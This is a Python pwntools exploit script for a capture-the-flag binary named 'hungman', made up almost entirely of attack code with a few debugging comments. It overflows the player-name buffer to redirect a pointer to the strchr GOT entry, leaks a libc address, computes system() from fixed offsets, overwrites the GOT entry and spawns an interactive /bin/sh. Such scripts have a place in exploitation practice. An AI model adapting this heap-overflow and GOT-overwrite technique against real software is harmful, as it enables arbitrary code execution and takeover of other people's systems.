from pwn import *

letters='abcdefghijklmnopqrstuvwxyzz'
name='A'*32
p=process('./hungman')
free_got=0x602018
strchr_got=0x602038
#context.log_level='debug'

def getpid(name):
	pid= pwnlib.util.proc.pidof(name)
	log.info(pid)
	raw_input('continue')

def play():
	print '-- play --'
	for c in letters:
		recv=p.recvline()
		print recv
		if recv.startswith('High score! change name?'):
			# I do not know why it need to print recv here,
			# or it will failed to recieve in line 42
			# time.sleep(0.1) can works here too. why ???
			print recv
			print '[*] win!'
			p.sendline('y')
			return
		if recv.startswith('Default Highscore  score: 64'):
			print '[-] try again...'
			p.recvuntil('Continue? ')
			p.sendline('y')
			return play()
		p.sendline(c)	

p.recvline()
p.sendline('A'*30)
p.recvline()
play()
p.sendline(name+p64(0x0)+p64(0x91)+p32(0x52)+p32(0xc9)+p64(strchr_got))
#context.update(terminal=['tmux','splitw','-h'])
#gdb.attach(p,'b *0x0000000000400E77')

p.recvuntil('Highest player: ')
strchr_addr=p.recvuntil(' score:')[:-7]
strchr_addr=u64(strchr_addr.ljust(8, '\0'))

# actually it is address of strchr_see2, not strchr
print 'strchr addr: '+hex(strchr_addr)
system_addr=strchr_addr-0x30-0x000000000007ff70+0x0000000000041490
print 'system addr: '+hex(system_addr)

p.recvuntil('Continue? ')
p.sendline('y')
play()
# getpid('hungman')
# can not use sendline() here cause it will crash printf@got.plt
p.send(p64(system_addr))
p.recvuntil('Continue? ')
p.sendline('y')
play()
p.sendline('/bin/sh')
p.interactive()

